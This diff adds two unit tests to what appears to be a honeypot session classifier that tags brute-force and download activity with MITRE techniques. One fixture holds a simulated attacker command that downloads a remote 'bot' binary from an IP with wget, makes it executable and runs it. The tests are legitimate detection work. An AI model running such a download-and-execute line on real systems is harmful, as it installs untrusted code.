@@ -381,6 +381,44 @@ def test_ssh_authorized_key_install_is_high_risk_commodity_bot():
     assert summary.risk_level == "high"
 
 
+def test_ssh_login_check_is_medium_risk_brute_force_led_by_password_guessing():
+    """A bot that confirms the guessed password with echo and leaves gets
+    its own technique, listed ahead of the general brute-force tag so the
+    alert leads with the confirmed-password fix."""
+    session = make_session(
+        "tcp_shell",
+        [("login: root", 0.0), ("password: admin", 0.0), (r'echo -e "\x6F\x6B"', 1.0)],
+        duration_seconds=1.5,
+    )
+
+    summary = classify_session(session, connection_count_from_same_ip=9)
+
+    assert "ssh_login_check" in summary.matched_rule_ids
+    assert summary.actor_label == "brute_force_bot"
+    assert summary.mitre_tags[0] == "T1110.001"
+    assert "T1110" in summary.mitre_tags
+    assert summary.intent == "credential_theft"
+    assert summary.risk_level == "medium"
+
+
+def test_echo_followed_by_a_download_does_not_match_the_login_check_rule():
+    session = make_session(
+        "tcp_shell",
+        [
+            ("login: root", 0.0),
+            ("password: admin", 0.0),
+            ("echo OK", 1.0),
+            ("cd /tmp; wget -q http://203.0.113.9/bot; chmod +x bot; ./bot", 2.0),
+        ],
+        duration_seconds=2.5,
+    )
+
+    summary = classify_session(session)
+
+    assert "ssh_login_check" not in summary.matched_rule_ids
+    assert summary.mitre_tags[0] == "T1105"
+
+
 def test_reading_authorized_keys_does_not_match_the_key_install_rule():
     session = make_session(
         "tcp_shell",
